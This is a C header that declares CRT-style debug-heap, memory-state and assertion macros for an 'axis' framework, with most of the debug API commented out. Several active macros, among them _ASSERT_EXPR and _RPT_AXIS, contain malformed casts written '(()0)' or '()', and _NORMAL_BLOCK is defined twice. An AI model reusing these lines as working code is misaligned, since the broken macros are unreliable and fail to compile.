#ifndef __AXIS_AXIS_DEBUG_H__
#define __AXIS_AXIS_DEBUG_H__


#pragma once


#define _NORMAL_BLOCK 1




/****************************************************************************
 *
 * Debug Reporting
 *
 ***************************************************************************/

typedef void * _HFILE; /* file handle pointer */

#define _CRT_WARN           0
#define _CRT_ERROR          1
#define _CRT_ASSERT         2
#define _CRT_ERRCNT         3

#define _CRTDBG_MODE_FILE      0x1
#define _CRTDBG_MODE_DEBUG     0x2
#define _CRTDBG_MODE_WNDW      0x4
#define _CRTDBG_REPORT_MODE    -1

#ifndef WINDOWS

#if defined(_M_IX86)
#define _CRTDBG_INVALID_HFILE ((_HFILE)-1)
#define _CRTDBG_HFILE_ERROR   ((_HFILE)-2)
#define _CRTDBG_FILE_STDOUT   ((_HFILE)-4)
#define _CRTDBG_FILE_STDERR   ((_HFILE)-5)
#define _CRTDBG_REPORT_FILE   ((_HFILE)-6)
#else
#define _CRTDBG_INVALID_HFILE ((_HFILE)(int64_t)-1)
#define _CRTDBG_HFILE_ERROR   ((_HFILE)(int64_t)-2)
#define _CRTDBG_FILE_STDOUT   ((_HFILE)(int64_t)-4)
#define _CRTDBG_FILE_STDERR   ((_HFILE)(int64_t)-5)
#define _CRTDBG_REPORT_FILE   ((_HFILE)(int64_t)-6)
#endif

#endif

typedef int32_t(DECL_C * _CRT_REPORT_HOOK)(int32_t, char *, int32_t *);
typedef int32_t(DECL_C * _CRT_REPORT_HOOKW)(int32_t, wchar_t *, int32_t *);

#define _CRT_RPTHOOK_INSTALL  0
#define _CRT_RPTHOOK_REMOVE   1
/****************************************************************************
 *
 * Heap
 *
 ***************************************************************************/

/****************************************************************************
 *
 * Client-defined allocation hook
 *
 ***************************************************************************/

#define _HOOK_ALLOC     1
#define _HOOK_REALLOC   2
#define _HOOK_FREE      3

#if !defined(_M_CEE_PURE)
typedef int32_t(DECL_C * _CRT_ALLOC_HOOK)(int32_t, void *, size_t, int32_t, long, const uchar *, int32_t);
#else
typedef int32_t(__clrcall * _CRT_ALLOC_HOOK)(int32_t, void *, size_t, int32_t, long, const uchar *, int32_t);
#endif
#if defined(_M_CEE)
typedef int32_t(__clrcall * _CRT_ALLOC_HOOK_M)(int32_t, void *, size_t, int32_t, long, const uchar *, int32_t);
#endif

/****************************************************************************
 *
 * Memory management
 *
 ***************************************************************************/

/*
 * Bit values for _crtDbgFlag flag:
 *
 * These bitflags control debug heap behavior.
 */

#define _CRTDBG_ALLOC_MEM_DF        0x01  /* Turn on debug allocation */
#define _CRTDBG_DELAY_FREE_MEM_DF   0x02  /* Don't actually free memory */
#define _CRTDBG_CHECK_ALWAYS_DF     0x04  /* Check heap every alloc/dealloc */
#define _CRTDBG_RESERVED_DF         0x08  /* Reserved - do not use */
#define _CRTDBG_CHECK_CRT_DF        0x10  /* Leak check/diff CRT blocks */
#define _CRTDBG_LEAK_CHECK_DF       0x20  /* Leak check at program exit */

/*
 * Some bit values for _crtDbgFlag which correspond to frequencies for checking
 * the the heap.
 */
#define _CRTDBG_CHECK_EVERY_16_DF   0x00100000  /* check heap every 16 heap ops */
#define _CRTDBG_CHECK_EVERY_128_DF  0x00800000  /* check heap every 128 heap ops */
#define _CRTDBG_CHECK_EVERY_1024_DF 0x04000000  /* check heap every 1024 heap ops */
/*
We do not check the heap by default at this point because the cost was too high
for some applications. You can still turn this feature on manually.
 */
#define _CRTDBG_CHECK_DEFAULT_DF    0

#define _CRTDBG_REPORT_FLAG         -1    /* Query bitflag status */

#define _BLOCK_TYPE(block)          (block & 0xFFFF)
#define _BLOCK_SUBTYPE(block)       (block >> 16 & 0xFFFF)


/****************************************************************************
 *
 * Memory state
 *
 ***************************************************************************/

/* Memory block identification */
#define _FREE_BLOCK      0
#define _NORMAL_BLOCK    1
#define _CRT_BLOCK       2
#define _IGNORE_BLOCK    3
#define _CLIENT_BLOCK    4
#define _MAX_BLOCKS      5

#if !defined(_M_CEE_PURE)
typedef void (DECL_C * _CRT_DUMP_CLIENT)(void *, size_t);
#else
typedef void (__clrcall * _CRT_DUMP_CLIENT)(void *, size_t);
#endif
#if defined(_M_CEE)
typedef void (__clrcall * _CRT_DUMP_CLIENT_M)(void *, size_t);
#endif


/****************************************************************************
 *
 * Declarations, prototype and function-like macros
 *
 ***************************************************************************/

/* _STATIC_ASSERT is for enforcing boolean/integral conditions at compile time.
   Since it is purely a compile-time mechanism that generates no code, the check
   is left in even if DEBUG is not defined. */

#ifndef _STATIC_ASSERT
#define _STATIC_ASSERT(expr) typedef char __static_assert_t[ (expr) ]
#endif
//
#ifndef DEBUG
//
// /****************************************************************************
// *
// * Debug OFF
// * Debug OFF
// * Debug OFF
// *
// ***************************************************************************/
//
///*  We allow our basic _ASSERT macros to be overridden by pre-existing definitions.
//    This is not the ideal mechanism, but is helpful in some scenarios and helps avoid
//    multiple definition problems */

#ifndef _ASSERT
#define _ASSERT(expr) ((void)0)
#endif

#ifndef _ASSERTE
#define _ASSERTE(expr) ((void)0)
#endif

#ifndef _ASSERT_EXPR
#define _ASSERT_EXPR(expr, expr_str) (()0)
#endif

#ifndef _ASSERT_AXIS
#define _ASSERT_AXIS _ASSERT_EXPR
#endif

//#define _RPT0(rptno, msg)
//#define _RPTW0(rptno, msg)
//
//#define _RPT1(rptno, msg, arg1)
//#define _RPTW1(rptno, msg, arg1)
//
//#define _RPT2(rptno, msg, arg1, arg2)
//#define _RPTW2(rptno, msg, arg1, arg2)
//
//#define _RPT3(rptno, msg, arg1, arg2, arg3)
//#define _RPTW3(rptno, msg, arg1, arg2, arg3)
//
//#define _RPT4(rptno, msg, arg1, arg2, arg3, arg4)
//#define _RPTW4(rptno, msg, arg1, arg2, arg3, arg4)
//
//#define _RPT5(rptno, msg, arg1, arg2, arg3, arg4, arg5)
//#define _RPTW5(rptno, msg, arg1, arg2, arg3, arg4, arg5)
//
//
//#define _RPTF0(rptno, msg)
//#define _RPTFW0(rptno, msg)
//
//#define _RPTF1(rptno, msg, arg1)
//#define _RPTFW1(rptno, msg, arg1)
//
//#define _RPTF2(rptno, msg, arg1, arg2)
//#define _RPTFW2(rptno, msg, arg1, arg2)
//
//#define _RPTF3(rptno, msg, arg1, arg2, arg3)
//#define _RPTFW3(rptno, msg, arg1, arg2, arg3)
//
//#define _RPTF4(rptno, msg, arg1, arg2, arg3, arg4)
//#define _RPTFW4(rptno, msg, arg1, arg2, arg3, arg4)
//
//#define _RPTF5(rptno, msg, arg1, arg2, arg3, arg4, arg5)
//#define _RPTFW5(rptno, msg, arg1, arg2, arg3, arg4, arg5)
//
//#define _malloc_dbg(s, t, f, l)         malloc(s)
//#define _calloc_dbg(ca, s, t, f, l)      calloc(ca, s)
//#define _realloc_dbg(p, s, t, f, l)     realloc(p, s)
//#define _recalloc_dbg(p, ca, s, t, f, l) _recalloc(p, ca, s)
//#define _expand_dbg(p, s, t, f, l)      _expand(p, s)
//#define _free_dbg(p, t)                 free(p)
//#define _msize_dbg(p, t)                _msize(p)
//
//#define _aligned_msize_dbg(p, a, o)                         _aligned_msize(p, a, o)
//#define _aligned_malloc_dbg(s, a, f, l)                     _aligned_malloc(s, a)
//#define _aligned_realloc_dbg(p, s, a, f, l)                 _aligned_realloc(p, s, a)
//#define _aligned_recalloc_dbg(p, ca, s, a, f, l)             _aligned_recalloc(p, ca, s, a)
//#define _aligned_free_dbg(p)				                _aligned_free(p)
//#define _aligned_offset_malloc_dbg(s, a, o, f, l)           _aligned_offset_malloc(s, a, o)
//#define _aligned_offset_realloc_dbg(p, s, a, o, f, l)       _aligned_offset_realloc(p, s, a, o)
//#define _aligned_offset_recalloc_dbg(p, ca, s, a, o, f, l)   _aligned_offset_recalloc(p, ca, s, a, o)
//
//#define _malloca_dbg(s, t, f, l)        _malloca(s)
//#define _freea_dbg(p, t)                _freea(p)
//
//#define _strdup_dbg(s, t, f, l)         _strdup(s)
//#define _wcsdup_dbg(s, t, f, l)         _wcsdup(s)
//#define _mbsdup_dbg(s, t, f, l)         _mbsdup(s)
//#define _tempnam_dbg(s1, s2, t, f, l)   _tempnam(s1, s2)
//#define _wtempnam_dbg(s1, s2, t, f, l)  _wtempnam(s1, s2)
//#define _fullpath_dbg(s1, s2, le, t, f, l)  _fullpath(s1, s2, le)
//#define _wfullpath_dbg(s1, s2, le, t, f, l) _wfullpath(s1, s2, le)
//#define _getcwd_dbg(s, le, t, f, l)     _getcwd(s, le)
//#define _wgetcwd_dbg(s, le, t, f, l)    _wgetcwd(s, le)
//#define _getdcwd_dbg(d, s, le, t, f, l)     _getdcwd(d, s, le)
//#define _wgetdcwd_dbg(d, s, le, t, f, l)    _wgetdcwd(d, s, le)
//#define _getdcwd_lk_dbg(d, s, le, t, f, l)  _getdcwd_nolock(d, s, le)
//#define _wgetdcwd_lk_dbg(d, s, le, t, f, l) _wgetdcwd_nolock(d, s, le)
//#define _dupenv_s_dbg(ps1, size, s2, t, f, l)  _dupenv_s(ps1, size, s2)
//#define _wdupenv_s_dbg(ps1, size, s2, t, f, l) _wdupenv_s(ps1, size, s2)
//
#define _CrtSetReportHook(f)                ((_CRT_REPORT_HOOK)0)
//#define _CrtGetReportHook()                 ((_CRT_REPORT_HOOK)0)
//#define _CrtSetReportHook2(t, f)            ((int32_t)0)
//#define _CrtSetReportHookW2(t, f)           ((int32_t)0)
//#define _CrtSetReportMode(t, f)             ((int32_t)0)
//#define _CrtSetReportFile(t, f)             ((_HFILE)0)
//
//#define _CrtDbgBreak()                      (()0)
//
//#define _CrtSetBreakAlloc(a)                ((long)0)
//
//#define _CrtSetAllocHook(f)                 ((_CRT_ALLOC_HOOK)0)
//#define _CrtGetAllocHook()                  ((_CRT_ALLOC_HOOK)0)
//
//#define _CrtCheckMemory()                   ((int32_t)1)
//#define _CrtSetDbgFlag(f)                   ((int32_t)0)
//#define _CrtDoForAllClientObjects(f, ca)     (()0)
//#define _CrtIsValidPointer(p, n, r)         ((int32_t)1)
//#define _CrtIsValidHeapPointer(p)           ((int32_t)1)
//#define _CrtIsMemoryBlock(p, t, r, f, l)    ((int32_t)1)
//#define _CrtReportBlockType(p)              ((int32_t)-1)
//
//#define _CrtSetDumpClient(f)                ((_CRT_DUMP_CLIENT)0)
//#define _CrtGetDumpClient()                 ((_CRT_DUMP_CLIENT)0)
//
//#define _CrtMemCheckpoint(s)                (()0)
//#define _CrtMemDifference(s1, s2, s3)       ((int32_t)0)
//#define _CrtMemDumpAllObjectsSince(s)       (()0)
//#define _CrtMemDumpStatistics(s)            (()0)
//#define _CrtDumpMemoryLeaks()               ((int32_t)0)
//#define _CrtSetDebugFillThreshold(t)        ((size_t)0)
//
//#define _CrtSetCheckCount(f)                ((int32_t)0)
//#define _CrtGetCheckCount()                 ((int32_t)0)
//
#else   /* DEBUG */
//
//
// /****************************************************************************
// *
// * Debug ON
// * Debug ON
// * Debug ON
// *
// ***************************************************************************/
//
//
///* Define _MRTIMP */
//
//#ifndef _MRTIMP
//#define _MRTIMP __declspec(dllimport)
//#endif  /* _MRTIMP */
//
///* Define CLASS_DECL_AXIS */
//
//#ifndef CLASS_DECL_AXIS
//#ifdef  _DLL
//#define CLASS_DECL_AXIS __declspec(dllimport)
//#else   /* ndef _DLL */
//#define CLASS_DECL_AXIS
//#endif  /* _DLL */
//#endif  /* CLASS_DECL_AXIS */
//
// /****************************************************************************
// *
// * Debug Reporting
// *
// ***************************************************************************/
//
//

#ifdef WINDOWS
#include <crtdbg.h>
#else
//#if !defined(_M_CEE_PURE)
//CLASS_DECL_AXIS extern long _crtAssertBusy;
//#endif /* !defined(_M_CEE_PURE) */
//
//#if !defined(_M_CEE_PURE)
//CLASS_DECL_AXIS _CRT_REPORT_HOOK DECL_C _CrtGetReportHook(
//    void
//    );
//#endif
//CLASS_DECL_AXIS int _CrtDbgReportW(
//   int reportType,
//   const wchar_t *filename,
//   int linenumber,
//   const wchar_t *moduleName,
//   const wchar_t *format,
//   ...
//   );
/* _CrtSetReportHook[[W]2]:
 * For IJW, we need 2 versions: 1 for clrcall and one for cdecl.
 * For pure and native, we just need clrcall and cdecl, respectively.
 */
CLASS_DECL_AXIS _CRT_REPORT_HOOK DECL_C _CrtSetReportHook(_CRT_REPORT_HOOK _PFnNewHook);
//CLASS_DECL_AXIS int32_t DECL_C _CrtSetReportHook2(int32_t _Mode, _CRT_REPORT_HOOK _PFnNewHook);
//CLASS_DECL_AXIS int32_t DECL_C _CrtSetReportHookW2(int32_t _Mode, _CRT_REPORT_HOOKW _PFnNewHook);
//
//CLASS_DECL_AXIS int32_t DECL_C _CrtSetReportMode(int32_t _ReportType, int32_t _ReportMode);
//CLASS_DECL_AXIS _HFILE DECL_C _CrtSetReportFile(int32_t _ReportType, _HFILE _ReportFile);
//CLASS_DECL_AXIS int32_t DECL_C _CrtDbgReport(int32_t _ReportType, const char * _Filename, int32_t _Linenumber, const char * _ModuleName, const char * _Format, ...);
//CLASS_DECL_AXIS size_t DECL_C _CrtSetDebugFillThreshold(size_t _NewDebugFillThreshold);
struct _CrtMemBlockHeader;

typedef struct _CrtMemState {
    struct _CrtMemBlockHeader * pBlockHeader;
    size_t lCounts[_MAX_BLOCKS];
    size_t lSizes[_MAX_BLOCKS];
    size_t lHighWaterCount;
    size_t lTotalCount;
} _CrtMemState;
CLASS_DECL_AXIS int32_t DECL_C _CrtDbgReportW(int32_t _ReportType, const wchar_t * _Filename, int32_t _LineNumber, const wchar_t * _ModuleName, const wchar_t * _Format, ...);

/* Asserts */
/* We use !! below to ensure that any overloaded operators used to evaluate expr do not end up at operator || */
#define _ASSERT_EXPR(expr, msg) \
        (void) ((!!(expr)) || \
                (1 != _CrtDbgReportW(_CRT_ASSERT, _WIDEN(__FILE__), __LINE__, NULL, msg)) || \
                (_CrtDbgBreak(), 0))
#define _RPT_AXIS(args) \
        () ((1 != _CrtDbgReport args) || \
                (_CrtDbgBreak(), 0))

#define _RPT_AXIS_W(args) \
        () ((1 != _CrtDbgReportW args) || \
                (_CrtDbgBreak(), 0))

#endif

#ifndef _ASSERT
#define _ASSERT(expr)   _ASSERT_EXPR((expr), NULL)
#endif

#ifndef _ASSERTE
#define _ASSERTE(expr)  _ASSERT_EXPR((expr), _WIDEN("##expr##"))
#endif

/*
We retain _ASSERT_AXIS solely for backwards compatibility with those who used it even though they
should not have done so since it was not documented.
 */
#ifndef _ASSERT_AXIS
#define _ASSERT_AXIS _ASSERT_EXPR
#endif

/* Reports with no file/line info */


//#define _RPT0(rptno, msg) \
//        _RPT_AXIS((rptno, NULL, 0, NULL, "%s", msg))
//
//#define _RPTW0(rptno, msg) \
//        _RPT_AXIS_W((rptno, NULL, 0, NULL, L"%s", msg))
//
//#define _RPT1(rptno, msg, arg1) \
//        _RPT_AXIS((rptno, NULL, 0, NULL, msg, arg1))
//
//#define _RPTW1(rptno, msg, arg1) \
//        _RPT_AXIS_W((rptno, NULL, 0, NULL, msg, arg1))
//
//#define _RPT2(rptno, msg, arg1, arg2) \
//        _RPT_AXIS((rptno, NULL, 0, NULL, msg, arg1, arg2))
//
//#define _RPTW2(rptno, msg, arg1, arg2) \
//        _RPT_AXIS_W((rptno, NULL, 0, NULL, msg, arg1, arg2))
//
//#define _RPT3(rptno, msg, arg1, arg2, arg3) \
//        _RPT_AXIS((rptno, NULL, 0, NULL, msg, arg1, arg2, arg3))
//
//#define _RPTW3(rptno, msg, arg1, arg2, arg3) \
//        _RPT_AXIS_W((rptno, NULL, 0, NULL, msg, arg1, arg2, arg3))
//
//#define _RPT4(rptno, msg, arg1, arg2, arg3, arg4) \
//        _RPT_AXIS((rptno, NULL, 0, NULL, msg, arg1, arg2, arg3, arg4))
//
//#define _RPTW4(rptno, msg, arg1, arg2, arg3, arg4) \
//        _RPT_AXIS_W((rptno, NULL, 0, NULL, msg, arg1, arg2, arg3, arg4))
//
//#define _RPT5(rptno, msg, arg1, arg2, arg3, arg4, arg5) \
//        _RPT_AXIS((rptno, NULL, 0, NULL, msg, arg1, arg2, arg3, arg4, arg5))
//
//#define _RPTW5(rptno, msg, arg1, arg2, arg3, arg4, arg5) \
//        _RPT_AXIS_W((rptno, NULL, 0, NULL, msg, arg1, arg2, arg3, arg4, arg5))
//
///* Reports with file/line info */
//
//#define _RPTF0(rptno, msg) \
//        _RPT_AXIS((rptno, __FILE__, __LINE__, NULL, "%s", msg))
//
//#define _RPTFW0(rptno, msg) \
//        _RPT_AXIS_W((rptno, _CRT_WIDE(__FILE__), __LINE__, NULL, L"%s", msg))
//
//#define _RPTF1(rptno, msg, arg1) \
//        _RPT_AXIS((rptno, __FILE__, __LINE__, NULL, msg, arg1))
//
//#define _RPTFW1(rptno, msg, arg1) \
//        _RPT_AXIS_W((rptno, _CRT_WIDE(__FILE__), __LINE__, NULL, msg, arg1))
//
//#define _RPTF2(rptno, msg, arg1, arg2) \
//        _RPT_AXIS((rptno, __FILE__, __LINE__, NULL, msg, arg1, arg2))
//
//#define _RPTFW2(rptno, msg, arg1, arg2) \
//        _RPT_AXIS_W((rptno, _CRT_WIDE(__FILE__), __LINE__, NULL, msg, arg1, arg2))
//
//#define _RPTF3(rptno, msg, arg1, arg2, arg3) \
//        _RPT_AXIS((rptno, __FILE__, __LINE__, NULL, msg, arg1, arg2, arg3))
//
//#define _RPTFW3(rptno, msg, arg1, arg2, arg3) \
//        _RPT_AXIS_W((rptno, _CRT_WIDE(__FILE__), __LINE__, NULL, msg, arg1, arg2, arg3))
//
//#define _RPTF4(rptno, msg, arg1, arg2, arg3, arg4) \
//        _RPT_AXIS((rptno, __FILE__, __LINE__, NULL, msg, arg1, arg2, arg3, arg4))
//
//#define _RPTFW4(rptno, msg, arg1, arg2, arg3, arg4) \
//        _RPT_AXIS_W((rptno, _CRT_WIDE(__FILE__), __LINE__, NULL, msg, arg1, arg2, arg3, arg4))
//
//#define _RPTF5(rptno, msg, arg1, arg2, arg3, arg4, arg5) \
//        _RPT_AXIS((rptno, __FILE__, __LINE__, NULL, msg, arg1, arg2, arg3, arg4, arg5))
//
//#define _RPTFW5(rptno, msg, arg1, arg2, arg3, arg4, arg5) \
//        _RPT_AXIS_W((rptno, _CRT_WIDE(__FILE__), __LINE__, NULL, msg, arg1, arg2, arg3, arg4, arg5))
//
//
//#if !defined(_CRT_PORTABLE) && !defined(LINUX)
//#define _CrtDbgBreak() __debugbreak()
//#else
//CLASS_DECL_AXIS void DECL_C _CrtDbgBreak();
//#endif
//
// /****************************************************************************
// *
// * Heap routines
// *
// ***************************************************************************/
//
//#ifdef  _CRTDBG_MAP_ALLOC
//
//#define   malloc(s)             _malloc_dbg(s, _NORMAL_BLOCK, __FILE__, __LINE__)
//#define   calloc(ca, s)          _calloc_dbg(ca, s, _NORMAL_BLOCK, __FILE__, __LINE__)
//#define   realloc(p, s)         _realloc_dbg(p, s, _NORMAL_BLOCK, __FILE__, __LINE__)
//#define   _recalloc(p, ca, s)    _recalloc_dbg(p, ca, s, _NORMAL_BLOCK, __FILE__, __LINE__)
//#define   _expand(p, s)         _expand_dbg(p, s, _NORMAL_BLOCK, __FILE__, __LINE__)
//#define   free(p)               _free_dbg(p, _NORMAL_BLOCK)
//#define   _msize(p)             _msize_dbg(p, _NORMAL_BLOCK)
//#define   _aligned_msize(p, a, o)                   _aligned_msize_dbg(p, a, o)
//#define   _aligned_malloc(s, a)                     _aligned_malloc_dbg(s, a, __FILE__, __LINE__)
//#define   _aligned_realloc(p, s, a)                 _aligned_realloc_dbg(p, s, a, __FILE__, __LINE__)
//#define   _aligned_recalloc(p, ca, s, a)             _aligned_recalloc_dbg(p, ca, s, a, __FILE__, __LINE__)
//#define   _aligned_offset_malloc(s, a, o)           _aligned_offset_malloc_dbg(s, a, o, __FILE__, __LINE__)
//#define   _aligned_offset_realloc(p, s, a, o)       _aligned_offset_realloc_dbg(p, s, a, o, __FILE__, __LINE__)
//#define   _aligned_offset_recalloc(p, ca, s, a, o)   _aligned_offset_recalloc_dbg(p, ca, s, a, o, __FILE__, __LINE__)
//#define   _aligned_free(p)  _aligned_free_dbg(p)
//
//#define   _malloca(s)        _malloca_dbg(s, _NORMAL_BLOCK, __FILE__, __LINE__)
//#define   _freea(p)          _freea_dbg(p, _NORMAL_BLOCK)
//
//#define   _strdup(s)         _strdup_dbg(s, _NORMAL_BLOCK, __FILE__, __LINE__)
//#define   _wcsdup(s)         _wcsdup_dbg(s, _NORMAL_BLOCK, __FILE__, __LINE__)
//#define   _mbsdup(s)         _strdup_dbg(s, _NORMAL_BLOCK, __FILE__, __LINE__)
//#define   _tempnam(s1, s2)   _tempnam_dbg(s1, s2, _NORMAL_BLOCK, __FILE__, __LINE__)
//#define   _wtempnam(s1, s2)  _wtempnam_dbg(s1, s2, _NORMAL_BLOCK, __FILE__, __LINE__)
//#define   _fullpath(s1, s2, le)     _fullpath_dbg(s1, s2, le, _NORMAL_BLOCK, __FILE__, __LINE__)
//#define   _wfullpath(s1, s2, le)    _wfullpath_dbg(s1, s2, le, _NORMAL_BLOCK, __FILE__, __LINE__)
//#define   _getcwd(s, le)      _getcwd_dbg(s, le, _NORMAL_BLOCK, __FILE__, __LINE__)
//#define   _wgetcwd(s, le)     _wgetcwd_dbg(s, le, _NORMAL_BLOCK, __FILE__, __LINE__)
//#define   _getdcwd(d, s, le)  _getdcwd_dbg(d, s, le, _NORMAL_BLOCK, __FILE__, __LINE__)
//#define   _wgetdcwd(d, s, le) _wgetdcwd_dbg(d, s, le, _NORMAL_BLOCK, __FILE__, __LINE__)
//#define   _getdcwd_nolock(d, s, le)     _getdcwd_lk_dbg(d, s, le, _NORMAL_BLOCK, __FILE__, __LINE__)
//#define   _wgetdcwd_nolock(d, s, le)    _wgetdcwd_lk_dbg(d, s, le, _NORMAL_BLOCK, __FILE__, __LINE__)
//#define   _dupenv_s(ps1, size, s2)      _dupenv_s_dbg(ps1, size, s2, _NORMAL_BLOCK, __FILE__, __LINE__)
//#define   _wdupenv_s(ps1, size, s2)     _wdupenv_s_dbg(ps1, size, s2, _NORMAL_BLOCK, __FILE__, __LINE__)
//
//#if     !__STDC__
//#define   strdup(s)          _strdup_dbg(s, _NORMAL_BLOCK, __FILE__, __LINE__)
//#define   wcsdup(s)          _wcsdup_dbg(s, _NORMAL_BLOCK, __FILE__, __LINE__)
//#define   tempnam(s1, s2)    _tempnam_dbg(s1, s2, _NORMAL_BLOCK, __FILE__, __LINE__)
//#define   getcwd(s, le)      _getcwd_dbg(s, le, _NORMAL_BLOCK, __FILE__, __LINE__)
//#endif
//
//
//#endif  /* _CRTDBG_MAP_ALLOC */
//
//#if !defined(_M_CEE_PURE)
//CLASS_DECL_AXIS extern long _crtBreakAlloc;      /* Break on this allocation */
//#endif /* !defined(_M_CEE_PURE) */
//
//CLASS_DECL_AXIS long DECL_C _CrtSetBreakAlloc(long _BreakAlloc);
//
//CLASS_DECL_AXIS void * DECL_C _malloc_dbg(size_t _Size, int32_t _BlockType, const char * _Filename, int32_t _LineNumber);
//CLASS_DECL_AXIS void * DECL_C _calloc_dbg(size_t _Count, size_t _Size, int32_t _BlockType, const char * _Filename, int32_t _LineNumber);
//CLASS_DECL_AXIS void * DECL_C _realloc_dbg(void * _Memory, size_t _NewSize, int32_t _BlockType, const char * _Filename, int32_t _LineNumber);
//CLASS_DECL_AXIS void * DECL_C _recalloc_dbg(void * _Memory, size_t _NumOfElements, size_t _SizeOfElements, int32_t _BlockType, const char * _Filename, int32_t _LineNumber);
//CLASS_DECL_AXIS void * DECL_C _expand_dbg(void * _Memory, size_t _NewSize, int32_t _BlockType, const char * _Filename, int32_t _LineNumber);
//CLASS_DECL_AXIS void DECL_C _free_dbg(void * _Memory, int32_t _BlockType);
//CLASS_DECL_AXIS size_t DECL_C _msize_dbg(void * _Memory, int32_t _BlockType);
//CLASS_DECL_AXIS size_t DECL_C _aligned_msize_dbg(void * _Memory, size_t _Alignment, size_t _Offset);
//CLASS_DECL_AXIS void * DECL_C _aligned_malloc_dbg(size_t _Size, size_t _Alignment, const char * _Filename, int32_t _LineNumber);
//CLASS_DECL_AXIS void * DECL_C _aligned_realloc_dbg(void * _Memory, size_t _NewSize, size_t _Alignment, const char * _Filename, int32_t _LineNumber);
//CLASS_DECL_AXIS void * DECL_C _aligned_recalloc_dbg(void * _Memory, size_t _NumOfElements, size_t _SizeOfElements, size_t _Alignment, const char * _Filename, int32_t _LineNumber);
//CLASS_DECL_AXIS void * DECL_C _aligned_offset_malloc_dbg(size_t _Size, size_t _Alignment, size_t _Offset, const char * _Filename, int32_t _LineNumber);
//CLASS_DECL_AXIS void * DECL_C _aligned_offset_realloc_dbg(void * _Memory, size_t _NewSize, size_t _Alignment, size_t _Offset, const char * _Filename, int32_t _LineNumber);
//CLASS_DECL_AXIS void * DECL_C _aligned_offset_recalloc_dbg(void * _Memory, size_t _NumOfElements, size_t _SizeOfElements, size_t _Alignment, size_t _Offset, const char * _Filename, int32_t _LineNumber);
//CLASS_DECL_AXIS void DECL_C _aligned_free_dbg(void * _Memory);
//CLASS_DECL_AXIS char * DECL_C _strdup_dbg(const char * _Str, int32_t _BlockType, const char * _Filename, int32_t _LineNumber);
//CLASS_DECL_AXIS wchar_t * DECL_C _wcsdup_dbg(const wchar_t * _Str, int32_t _BlockType, const char * _Filename, int32_t _LineNumber);
//CLASS_DECL_AXIS char * DECL_C _tempnam_dbg(const char * _DirName, const char * _FilePrefix, int32_t _BlockType, const char * _Filename, int32_t _LineNumber);
//CLASS_DECL_AXIS wchar_t * DECL_C _wtempnam_dbg(const wchar_t * _DirName, const wchar_t * _FilePrefix, int32_t _BlockType, const char * _Filename, int32_t _LineNumber);
//CLASS_DECL_AXIS char * DECL_C _fullpath_dbg(char * _FullPath, const char * _Path, size_t _SizeInBytes, int32_t _BlockType, const char * _Filename, int32_t _LineNumber);
//CLASS_DECL_AXIS wchar_t * DECL_C _wfullpath_dbg(wchar_t * _FullPath, const wchar_t * _Path, size_t _SizeInWords, int32_t _BlockType, const char * _Filename, int32_t _LineNumber);
//CLASS_DECL_AXIS char * DECL_C _getcwd_dbg(char * _DstBuf, int32_t _SizeInBytes, int32_t _BlockType, const char * _Filename, int32_t _LineNumber);
//CLASS_DECL_AXIS wchar_t * DECL_C _wgetcwd_dbg(wchar_t * _DstBuf, int32_t _SizeInWords, int32_t _BlockType, const char * _Filename, int32_t _LineNumber);
//CLASS_DECL_AXIS char * DECL_C _getdcwd_dbg(int32_t _Drive, char * _DstBuf, int32_t _SizeInBytes, int32_t _BlockType, const char * _Filename, int32_t _LineNumber);
//CLASS_DECL_AXIS wchar_t * DECL_C _wgetdcwd_dbg(int32_t _Drive, wchar_t * _DstBuf, int32_t _SizeInWords, int32_t _BlockType, const char * _Filename, int32_t _LineNumber);
//
//char * DECL_C _getdcwd_lk_dbg(int32_t _Drive, char * _DstBuf, int32_t _SizeInBytes, int32_t _BlockType, const char * _Filename, int32_t _LineNumber);
//wchar_t * DECL_C _wgetdcwd_lk_dbg(int32_t _Drive, wchar_t * _DstBuf, int32_t _SizeInWords, int32_t _BlockType, const char * _Filename, int32_t _LineNumber);
//
//CLASS_DECL_AXIS errno_t DECL_C _dupenv_s_dbg(char ** _PBuffer, size_t * _PBufferSizeInBytes, const char * _VarName, int32_t _BlockType, const char * _Filename, int32_t _LineNumber);
//CLASS_DECL_AXIS errno_t DECL_C _wdupenv_s_dbg(wchar_t ** _PBuffer, size_t * _PBufferSizeInWords, const wchar_t * _VarName, int32_t _BlockType, const char * _Filename, int32_t _LineNumber);
//
///*_Success_(return!=0)
//_Check_return_ _Ret_opt_bytecap_x_(_NumOfElements*_SizeOfElements) CLASS_DECL_AXIS void * DECL_C _recalloc_dbg
//(
//        _Post_ptr_invalid_ void * _Memory,
//        _In_ size_t _NumOfElements,
//        _In_ size_t _SizeOfElements,
//        _In_ int32_t _BlockType,
//        _In_opt_z_ const char * _Filename,
//        _In_ int32_t _LineNumber
//);
//
//_Check_return_ _Ret_opt_bytecap_(_NewSize) CLASS_DECL_AXIS void * DECL_C _expand_dbg(
//        _Pre_notnull_ void * _Memory,
//        _In_ size_t _NewSize,
//        _In_ int32_t _BlockType,
//        _In_opt_z_ const char * _Filename,
//        _In_ int32_t _LineNumber
//        );
//
//CLASS_DECL_AXIS void DECL_C _free_dbg(
//        _Post_ptr_invalid_ void * _Memory,
//        _In_ int32_t _BlockType
//        );
//
//CLASS_DECL_AXIS size_t DECL_C _msize_dbg (
//        _Pre_notnull_ void * _Memory,
//        _In_ int32_t _BlockType
//        );
//
//CLASS_DECL_AXIS size_t DECL_C _aligned_msize_dbg (
//        _Pre_notnull_ void * _Memory,
//        _In_ size_t _Alignment,
//        _In_ size_t _Offset
//        );
//
//_Check_return_ _Ret_opt_bytecap_(_Size) CLASS_DECL_AXIS void * DECL_C _aligned_malloc_dbg(
//        _In_ size_t _Size,
//        _In_ size_t _Alignment,
//        _In_opt_z_ const char * _Filename,
//        _In_ int32_t _LineNumber
//        );
//
//_Success_(return!=0)
//_Check_return_ _Ret_opt_bytecap_(_NewSize) CLASS_DECL_AXIS void * DECL_C _aligned_realloc_dbg(
//        _Post_ptr_invalid_ void * _Memory,
//        _In_ size_t _NewSize,
//        _In_ size_t _Alignment,
//        _In_opt_z_ const char * _Filename,
//        _In_ int32_t _LineNumber
//        );
//
//_Success_(return!=0)
//_Check_return_ _Ret_opt_bytecap_x_(_NumOfElements*_SizeOfElements) CLASS_DECL_AXIS void * DECL_C _aligned_recalloc_dbg
//(
//        _Post_ptr_invalid_ void * _Memory,
//        _In_ size_t _NumOfElements,
//        _In_ size_t _SizeOfElements,
//        _In_ size_t _Alignment,
//        _In_opt_z_ const char * _Filename,
//        _In_ int32_t _LineNumber
//);
//
